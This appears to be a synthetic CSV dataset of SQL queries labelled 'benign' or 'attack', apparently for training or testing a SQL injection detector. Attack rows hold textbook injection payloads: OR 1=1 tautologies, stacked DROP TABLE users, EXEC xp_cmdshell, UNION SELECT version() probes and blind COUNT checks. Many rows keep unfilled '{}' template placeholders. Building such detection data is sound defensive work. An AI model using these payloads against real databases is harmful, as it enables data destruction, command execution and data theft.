query,label
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('585', '704', 45);",benign
SELECT * FROM users WHERE id=''; DROP TABLE users; --';,attack
DELETE FROM sessions WHERE session_id='573';,benign
"SELECT name, email FROM customers WHERE email='' OR 1=1--';",attack
SELECT * FROM users WHERE id=''; EXEC xp_cmdshell('dir'); --';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('296', '333', 43);",benign
UPDATE products SET price='; EXEC xp_cmdshell('dir'); -- WHERE id='{}';,attack
"SELECT name, email FROM customers WHERE email='860';",benign
"SELECT name, email FROM customers WHERE email='159';",benign
DELETE FROM sessions WHERE session_id='' AND 1=(SELECT COUNT(*) FROM tab); --';,attack
"SELECT name, email FROM customers WHERE email=''; EXEC xp_cmdshell('dir'); --';",attack
"UPDATE products SET price=' UNION SELECT NULL, version(), NULL -- WHERE id='{}';",attack
UPDATE products SET price=581 WHERE id='903';,benign
UPDATE products SET price=380 WHERE id='268';,benign
"UPDATE products SET price=' UNION SELECT NULL, version(), NULL -- WHERE id='{}';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES (''; DROP TABLE users; --', '{}', {});",attack
DELETE FROM sessions WHERE session_id='678';,benign
SELECT * FROM users WHERE id='951';,benign
SELECT * FROM users WHERE id='41';,benign
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
UPDATE products SET price=' OR 1=1-- WHERE id='{}';,attack
SELECT * FROM users WHERE id='190';,benign
"SELECT name, email FROM customers WHERE email='849';",benign
DELETE FROM sessions WHERE session_id='51';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('964', '412', 229);",benign
"SELECT name, email FROM customers WHERE email='412';",benign
"SELECT name, email FROM customers WHERE email='' UNION SELECT NULL, version(), NULL --';",attack
SELECT * FROM users WHERE id='202';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('95', '308', 893);",benign
SELECT * FROM users WHERE id='184';,benign
UPDATE products SET price=637 WHERE id='741';,benign
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
"SELECT name, email FROM customers WHERE email='507';",benign
"UPDATE products SET price=' UNION SELECT NULL, version(), NULL -- WHERE id='{}';",attack
"SELECT name, email FROM customers WHERE email='756';",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR '1'='1', '{}', {});",attack
"DELETE FROM sessions WHERE session_id='' UNION SELECT NULL, version(), NULL --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR 1=1--', '{}', {});",attack
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
SELECT * FROM users WHERE id='24';,benign
"SELECT name, email FROM customers WHERE email='' AND 1=(SELECT COUNT(*) FROM tab); --';",attack
"SELECT name, email FROM customers WHERE email='544';",benign
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
UPDATE products SET price=162 WHERE id='483';,benign
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('138', '494', 554);",benign
SELECT * FROM users WHERE id='' AND 1=(SELECT COUNT(*) FROM tab); --';,attack
UPDATE products SET price=' AND 1=(SELECT COUNT(*) FROM tab); -- WHERE id='{}';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR 1=1--', '{}', {});",attack
UPDATE products SET price=' OR 1=1-- WHERE id='{}';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR 1=1--', '{}', {});",attack
SELECT * FROM users WHERE id='528';,benign
DELETE FROM sessions WHERE session_id='' AND 1=(SELECT COUNT(*) FROM tab); --';,attack
SELECT * FROM users WHERE id='529';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('534', '756', 278);",benign
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
DELETE FROM sessions WHERE session_id='' AND 1=(SELECT COUNT(*) FROM tab); --';,attack
DELETE FROM sessions WHERE session_id='11';,benign
"UPDATE products SET price=' UNION SELECT NULL, version(), NULL -- WHERE id='{}';",attack
UPDATE products SET price=835 WHERE id='83';,benign
SELECT * FROM users WHERE id=''; EXEC xp_cmdshell('dir'); --';,attack
"DELETE FROM sessions WHERE session_id='' UNION SELECT NULL, version(), NULL --';",attack
SELECT * FROM users WHERE id=''; DROP TABLE users; --';,attack
"SELECT name, email FROM customers WHERE email='' UNION SELECT NULL, version(), NULL --';",attack
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR '1'='1', '{}', {});",attack
SELECT * FROM users WHERE id='96';,benign
DELETE FROM sessions WHERE session_id=''; DROP TABLE users; --';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('768', '632', 180);",benign
SELECT * FROM users WHERE id='' AND 1=(SELECT COUNT(*) FROM tab); --';,attack
"SELECT name, email FROM customers WHERE email='197';",benign
UPDATE products SET price=191 WHERE id='393';,benign
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
UPDATE products SET price='; DROP TABLE users; -- WHERE id='{}';,attack
"SELECT name, email FROM customers WHERE email='427';",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('844', '449', 713);",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('986', '865', 256);",benign
DELETE FROM sessions WHERE session_id='121';,benign
UPDATE products SET price='; DROP TABLE users; -- WHERE id='{}';,attack
SELECT * FROM users WHERE id='497';,benign
"SELECT name, email FROM customers WHERE email=''; EXEC xp_cmdshell('dir'); --';",attack
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
"SELECT name, email FROM customers WHERE email='' AND 1=(SELECT COUNT(*) FROM tab); --';",attack
UPDATE products SET price='; DROP TABLE users; -- WHERE id='{}';,attack
UPDATE products SET price='; DROP TABLE users; -- WHERE id='{}';,attack
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
SELECT * FROM users WHERE id='' OR '1'='1';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('661', '979', 763);",benign
"SELECT name, email FROM customers WHERE email='' OR '1'='1';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR '1'='1', '{}', {});",attack
SELECT * FROM users WHERE id='159';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES (''; DROP TABLE users; --', '{}', {});",attack
"SELECT name, email FROM customers WHERE email='564';",benign
"SELECT name, email FROM customers WHERE email='383';",benign
"SELECT name, email FROM customers WHERE email=''; DROP TABLE users; --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES (''; DROP TABLE users; --', '{}', {});",attack
UPDATE products SET price=' AND 1=(SELECT COUNT(*) FROM tab); -- WHERE id='{}';,attack
DELETE FROM sessions WHERE session_id='' OR 1=1--';,attack
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
UPDATE products SET price=' AND 1=(SELECT COUNT(*) FROM tab); -- WHERE id='{}';,attack
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('116', '297', 828);",benign
UPDATE products SET price=762 WHERE id='892';,benign
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES (''; EXEC xp_cmdshell('dir'); --', '{}', {});",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('171', '774', 776);",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('62', '529', 67);",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES (''; EXEC xp_cmdshell('dir'); --', '{}', {});",attack
"SELECT name, email FROM customers WHERE email='' AND 1=(SELECT COUNT(*) FROM tab); --';",attack
"SELECT name, email FROM customers WHERE email='512';",benign
DELETE FROM sessions WHERE session_id='727';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR 1=1--', '{}', {});",attack
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('995', '13', 243);",benign
SELECT * FROM users WHERE id='' OR 1=1--';,attack
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
DELETE FROM sessions WHERE session_id='140';,benign
"SELECT name, email FROM customers WHERE email='930';",benign
"DELETE FROM sessions WHERE session_id='' UNION SELECT NULL, version(), NULL --';",attack
"SELECT name, email FROM customers WHERE email='' UNION SELECT NULL, version(), NULL --';",attack
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
"SELECT name, email FROM customers WHERE email='805';",benign
UPDATE products SET price=586 WHERE id='424';,benign
"SELECT name, email FROM customers WHERE email=''; DROP TABLE users; --';",attack
"SELECT name, email FROM customers WHERE email='241';",benign
"SELECT name, email FROM customers WHERE email='' OR '1'='1';",attack
SELECT * FROM users WHERE id='180';,benign
DELETE FROM sessions WHERE session_id='11';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES (''; EXEC xp_cmdshell('dir'); --', '{}', {});",attack
SELECT * FROM users WHERE id='530';,benign
SELECT * FROM users WHERE id='139';,benign
UPDATE products SET price=' OR '1'='1 WHERE id='{}';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('900', '932', 992);",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('678', '429', 194);",benign
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
SELECT * FROM users WHERE id='' AND 1=(SELECT COUNT(*) FROM tab); --';,attack
DELETE FROM sessions WHERE session_id='438';,benign
SELECT * FROM users WHERE id=''; EXEC xp_cmdshell('dir'); --';,attack
SELECT * FROM users WHERE id=''; DROP TABLE users; --';,attack
"SELECT name, email FROM customers WHERE email='885';",benign
UPDATE products SET price=194 WHERE id='244';,benign
UPDATE products SET price=412 WHERE id='281';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR '1'='1', '{}', {});",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES (''; EXEC xp_cmdshell('dir'); --', '{}', {});",attack
UPDATE products SET price=' OR '1'='1 WHERE id='{}';,attack
DELETE FROM sessions WHERE session_id='921';,benign
"SELECT name, email FROM customers WHERE email=''; EXEC xp_cmdshell('dir'); --';",attack
"SELECT name, email FROM customers WHERE email=''; DROP TABLE users; --';",attack
UPDATE products SET price=990 WHERE id='259';,benign
DELETE FROM sessions WHERE session_id='' AND 1=(SELECT COUNT(*) FROM tab); --';,attack
"SELECT name, email FROM customers WHERE email=''; DROP TABLE users; --';",attack
SELECT * FROM users WHERE id='909';,benign
DELETE FROM sessions WHERE session_id='' OR 1=1--';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' AND 1=(SELECT COUNT(*) FROM tab); --', '{}', {});",attack
"SELECT name, email FROM customers WHERE email='' OR '1'='1';",attack
UPDATE products SET price=808 WHERE id='435';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('534', '604', 260);",benign
"SELECT name, email FROM customers WHERE email=''; DROP TABLE users; --';",attack
DELETE FROM sessions WHERE session_id='198';,benign
UPDATE products SET price='; DROP TABLE users; -- WHERE id='{}';,attack
"SELECT name, email FROM customers WHERE email=''; DROP TABLE users; --';",attack
"SELECT name, email FROM customers WHERE email='' OR 1=1--';",attack
SELECT * FROM users WHERE id='918';,benign
UPDATE products SET price=940 WHERE id='842';,benign
DELETE FROM sessions WHERE session_id='582';,benign
"DELETE FROM sessions WHERE session_id='' UNION SELECT NULL, version(), NULL --';",attack
"SELECT name, email FROM customers WHERE email='117';",benign
SELECT * FROM users WHERE id='762';,benign
UPDATE products SET price=' OR '1'='1 WHERE id='{}';,attack
DELETE FROM sessions WHERE session_id='197';,benign
SELECT * FROM users WHERE id='643';,benign
"SELECT name, email FROM customers WHERE email='355';",benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR 1=1--', '{}', {});",attack
SELECT * FROM users WHERE id='576';,benign
DELETE FROM sessions WHERE session_id='34';,benign
UPDATE products SET price='; DROP TABLE users; -- WHERE id='{}';,attack
SELECT * FROM users WHERE id=''; DROP TABLE users; --';,attack
SELECT * FROM users WHERE id='501';,benign
"SELECT name, email FROM customers WHERE email='' UNION SELECT NULL, version(), NULL --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' UNION SELECT NULL, version(), NULL --', '{}', {});",attack
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
"SELECT name, email FROM customers WHERE email=''; EXEC xp_cmdshell('dir'); --';",attack
SELECT * FROM users WHERE id='371';,benign
UPDATE products SET price=288 WHERE id='157';,benign
"SELECT name, email FROM customers WHERE email='339';",benign
"UPDATE products SET price=' UNION SELECT NULL, version(), NULL -- WHERE id='{}';",attack
UPDATE products SET price=107 WHERE id='107';,benign
"SELECT name, email FROM customers WHERE email='41';",benign
SELECT * FROM users WHERE id='633';,benign
UPDATE products SET price=' AND 1=(SELECT COUNT(*) FROM tab); -- WHERE id='{}';,attack
"SELECT name, email FROM customers WHERE email='1000';",benign
DELETE FROM sessions WHERE session_id='806';,benign
UPDATE products SET price=465 WHERE id='217';,benign
SELECT * FROM users WHERE id='172';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' AND 1=(SELECT COUNT(*) FROM tab); --', '{}', {});",attack
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('987', '803', 354);",benign
SELECT * FROM users WHERE id='' OR '1'='1';,attack
UPDATE products SET price=188 WHERE id='686';,benign
SELECT * FROM users WHERE id='255';,benign
SELECT * FROM users WHERE id='11';,benign
"SELECT name, email FROM customers WHERE email='' OR 1=1--';",attack
"DELETE FROM sessions WHERE session_id='' UNION SELECT NULL, version(), NULL --';",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('602', '466', 979);",benign
UPDATE products SET price=563 WHERE id='330';,benign
"DELETE FROM sessions WHERE session_id='' UNION SELECT NULL, version(), NULL --';",attack
DELETE FROM sessions WHERE session_id='' OR 1=1--';,attack
UPDATE products SET price=690 WHERE id='403';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR '1'='1', '{}', {});",attack
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
"SELECT name, email FROM customers WHERE email='220';",benign
UPDATE products SET price=671 WHERE id='640';,benign
"SELECT name, email FROM customers WHERE email='840';",benign
UPDATE products SET price=87 WHERE id='600';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' OR 1=1--', '{}', {});",attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES (''; EXEC xp_cmdshell('dir'); --', '{}', {});",attack
UPDATE products SET price=948 WHERE id='517';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('174', '540', 613);",benign
"SELECT * FROM users WHERE id='' UNION SELECT NULL, version(), NULL --';",attack
DELETE FROM sessions WHERE session_id=''; EXEC xp_cmdshell('dir'); --';,attack
DELETE FROM sessions WHERE session_id='' OR '1'='1';,attack
"SELECT name, email FROM customers WHERE email='' OR 1=1--';",attack
SELECT * FROM users WHERE id='521';,benign
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('' UNION SELECT NULL, version(), NULL --', '{}', {});",attack
UPDATE products SET price=' OR '1'='1 WHERE id='{}';,attack
"INSERT INTO orders (user_id, product_id, quantity) VALUES ('945', '862', 960);",benign
